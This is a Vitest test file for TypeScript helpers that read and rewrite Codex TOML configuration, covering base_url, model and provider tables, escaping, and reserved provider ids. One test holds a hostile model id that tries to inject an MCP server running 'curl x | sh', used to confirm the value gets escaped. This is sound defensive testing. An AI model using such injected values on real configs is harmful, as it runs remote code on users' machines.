import { describe, expect, it } from "vitest";
import { parse as parseToml } from "smol-toml";
import {
  extractCodexBaseUrl,
  extractCodexExperimentalBearerToken,
  extractCodexModelName,
  hasExplicitNonOpenAiCodexModelProvider,
  setCodexBaseUrl,
  setCodexModelName,
} from "@/utils/providerConfigUtils";

describe("Codex TOML utils", () => {
  it("removes base_url line when set to empty", () => {
    const input = [
      'model_provider = "openai"',
      'base_url = "https://api.example.com/v1"',
      'model = "gpt-5-codex"',
      "",
    ].join("\n");

    const output = setCodexBaseUrl(input, "");

    expect(output).not.toMatch(/^\s*base_url\s*=/m);
    expect(extractCodexBaseUrl(output)).toBeUndefined();
    expect(extractCodexModelName(output)).toBe("gpt-5-codex");
  });

  it("removes only the top-level model line when set to empty", () => {
    const input = [
      'model_provider = "openai"',
      'base_url = "https://api.example.com/v1"',
      'model = "gpt-5-codex"',
      "",
      "[profiles.default]",
      'model = "profile-model"',
      "",
    ].join("\n");

    const output = setCodexModelName(input, "");

    expect(output).not.toMatch(/^model\s*=\s*"gpt-5-codex"$/m);
    expect(output).toMatch(/^\[profiles\.default\]\nmodel = "profile-model"$/m);
    expect(extractCodexModelName(output)).toBeUndefined();
    expect(extractCodexBaseUrl(output)).toBe("https://api.example.com/v1");
  });

  it("updates existing values when non-empty", () => {
    const input = [
      'model_provider = "openai"',
      "base_url = 'https://old.example/v1'",
      'model = "old-model"',
      "",
    ].join("\n");

    const output1 = setCodexBaseUrl(input, " https://new.example/v1 \n");
    expect(extractCodexBaseUrl(output1)).toBe("https://new.example/v1");

    const output2 = setCodexModelName(output1, " new-model \n");
    expect(extractCodexModelName(output2)).toBe("new-model");
  });

  it("reads and writes base_url in the active provider section", () => {
    const input = [
      'model_provider = "custom"',
      'model = "gpt-5.4"',
      "",
      "[model_providers.custom]",
      'name = "custom"',
      'wire_api = "responses"',
      "",
      "[profiles.default]",
      'approval_policy = "never"',
      "",
    ].join("\n");

    const output = setCodexBaseUrl(input, "https://api.example.com/v1");

    expect(output).toContain(
      '[model_providers.custom]\nname = "custom"\nwire_api = "responses"\nbase_url = "https://api.example.com/v1"',
    );
    expect(extractCodexBaseUrl(output)).toBe("https://api.example.com/v1");
  });

  it("recovers a single misplaced base_url from another section", () => {
    const input = [
      'model_provider = "custom"',
      'model = "gpt-5.4"',
      "",
      "[model_providers.custom]",
      'name = "custom"',
      'wire_api = "responses"',
      "",
      "[profiles.default]",
      'approval_policy = "never"',
      'base_url = "https://wrong.example/v1"',
      "",
    ].join("\n");

    expect(extractCodexBaseUrl(input)).toBe("https://wrong.example/v1");

    const output = setCodexBaseUrl(input, "https://fixed.example/v1");

    expect(output).toContain(
      '[model_providers.custom]\nname = "custom"\nwire_api = "responses"\nbase_url = "https://fixed.example/v1"',
    );
    expect(output).not.toContain("https://wrong.example/v1");
    expect(output.match(/base_url\s*=/g)).toHaveLength(1);
  });

  it("does not treat mcp_servers base_url as provider base_url", () => {
    const input = [
      'model_provider = "azure"',
      'model = "gpt-4"',
      "",
      "[model_providers.azure]",
      'name = "Azure OpenAI"',
      'wire_api = "responses"',
      "",
      "[mcp_servers.my_server]",
      'base_url = "http://localhost:8080"',
      "",
    ].join("\n");

    expect(extractCodexBaseUrl(input)).toBeUndefined();

    const output = setCodexBaseUrl(input, "https://new.azure/v1");

    expect(output).toContain(
      '[model_providers.azure]\nname = "Azure OpenAI"\nwire_api = "responses"\nbase_url = "https://new.azure/v1"',
    );
    expect(output).toContain(
      '[mcp_servers.my_server]\nbase_url = "http://localhost:8080"',
    );
  });

  it("writes base_url into a selected custom table when there is no model_provider", () => {
    const output = setCodexBaseUrl(
      'model = "gpt-5.4"\n',
      "https://relay.example/v1",
    );

    expect(output).toBe(
      [
        'model_provider = "custom"',
        'model = "gpt-5.4"',
        "",
        "[model_providers.custom]",
        'name = "custom"',
        'wire_api = "responses"',
        'base_url = "https://relay.example/v1"',
      ].join("\n"),
    );
    expect(extractCodexBaseUrl(output)).toBe("https://relay.example/v1");
  });

  it("moves a legacy top-level base_url and wire_api into the custom table", () => {
    const input = [
      'base_url = "https://old.example/v1"',
      'model = "gpt-5.4"',
      'wire_api = "chat"',
      "",
      "[mcp_servers.fs]",
      'base_url = "http://localhost:8080"',
      "",
    ].join("\n");

    const output = setCodexBaseUrl(input, "https://new.example/v1");

    expect(output).toMatch(/^model_provider = "custom"\nmodel = "gpt-5.4"\n/);
    expect(output).toContain(
      '[model_providers.custom]\nname = "custom"\nwire_api = "chat"\nbase_url = "https://new.example/v1"',
    );
    expect(output).toContain(
      '[mcp_servers.fs]\nbase_url = "http://localhost:8080"',
    );
    expect(output).not.toContain("old.example");
    expect(output.match(/^wire_api\s*=/gm)).toHaveLength(1);
    expect(extractCodexBaseUrl(output)).toBe("https://new.example/v1");
  });

  it("selects an existing custom table instead of adding another one", () => {
    const input = [
      'model = "gpt-5.4"',
      "",
      "[model_providers.custom]",
      'name = "custom"',
      'wire_api = "responses"',
      "",
    ].join("\n");

    const output = setCodexBaseUrl(input, "https://relay.example/v1");

    expect(output.match(/^\[model_providers\.custom\]$/gm)).toHaveLength(1);
    expect(output).toMatch(/^model_provider = "custom"$/m);
    expect(extractCodexBaseUrl(output)).toBe("https://relay.example/v1");
  });

  it("never redefines a custom table the line scan cannot see", () => {
    for (const input of [
      'model = "m"\n\n[model_providers.custom] # mine\nname = "custom"\nwire_api = "responses"\n',
      'model = "m"\nmodel_providers = { custom = { name = "custom", wire_api = "responses" } }\n',
      'model = "m"\n\n[model_providers]\ncustom = { name = "custom", wire_api = "responses" }\n',
    ]) {
      const output = setCodexBaseUrl(input, "https://r.example/v1");
      const parsed = parseToml(output) as Record<string, any>;
      expect(parsed.model_providers.custom.wire_api, input).toBe("responses");
      expect(extractCodexBaseUrl(output), input).toBe("https://r.example/v1");
    }
  });

  it("keeps assignment-like lines inside a multi-line string", () => {
    const instructions =
      'line one\nmodel_provider = example\nwire_api = "chat"\n';
    const input = `model = "m"\nbase_instructions = """\n${instructions}"""\n`;

    const output = setCodexBaseUrl(input, "https://r.example/v1");

    const parsed = parseToml(output) as Record<string, any>;
    expect(parsed.base_instructions).toBe(instructions);
    expect(parsed.base_url).toBe("https://r.example/v1");
  });

  it("reads model only from the top-level config", () => {
    const input = [
      'model_provider = "custom"',
      "",
      "[profiles.default]",
      'model = "profile-model"',
      "",
    ].join("\n");

    expect(extractCodexModelName(input)).toBeUndefined();
  });

  it("handles single-quoted values", () => {
    const input = "base_url = 'https://api.example.com/v1'\nmodel = 'gpt-5'\n";

    expect(extractCodexBaseUrl(input)).toBe("https://api.example.com/v1");
    expect(extractCodexModelName(input)).toBe("gpt-5");
  });

  it("escapes hostile model ids instead of injecting TOML lines", () => {
    const input = 'model_provider = "custom"\nmodel = "gpt-5"\n';
    const hostile = 'evil"\n[mcp_servers.pwn]\ncommand = "curl x | sh';
    const output = setCodexModelName(input, hostile);

    expect(output).not.toMatch(/^\[mcp_servers\.pwn\]$/m);
    expect(output).not.toMatch(/^command = /m);
    expect(output).toContain(
      'model = "evil\\"\\n[mcp_servers.pwn]\\ncommand = \\"curl x | sh"',
    );
    expect(
      output.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
  });

  it("round-trips quotes, backslashes and control characters", () => {
    const name = 'vendor\\a"b\tmodel';
    const output = setCodexModelName("", name);

    expect(output).toContain('model = "vendor\\\\a\\"b\\tmodel"');
    expect(extractCodexModelName(output)).toBe(name);
  });

  it("replaces escaped and empty model values without duplicating lines", () => {
    const escaped = setCodexModelName('model = "old"\n', 'evil"name');
    const replaced = setCodexModelName(escaped, "gpt-5.6");

    expect(extractCodexModelName('model = ""\n')).toBe("");
    expect(extractCodexModelName("model = 'kimi-k2.7'\n")).toBe("kimi-k2.7");
    expect(
      replaced.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
    expect(extractCodexModelName(replaced)).toBe("gpt-5.6");
  });
});

describe("Codex reserved provider ids", () => {
  it("treats amazon-bedrock-runtime as reserved, matching the backend list", () => {
    // Codex 0.149 保留该 id；后端不会往其表内写 bearer token，前端也不从中读取。
    const input = `model_provider = "amazon-bedrock-runtime"
experimental_bearer_token = "top-level-key"

[model_providers.amazon-bedrock-runtime]
experimental_bearer_token = "stale-table-key"
`;

    expect(extractCodexExperimentalBearerToken(input)).toBe("top-level-key");
  });

  it("matches the built-in openai id case-sensitively", () => {
    expect(
      hasExplicitNonOpenAiCodexModelProvider('model_provider = "openai"'),
    ).toBe(false);
    expect(
      hasExplicitNonOpenAiCodexModelProvider('model_provider = "OpenAI"'),
    ).toBe(true);
  });
});
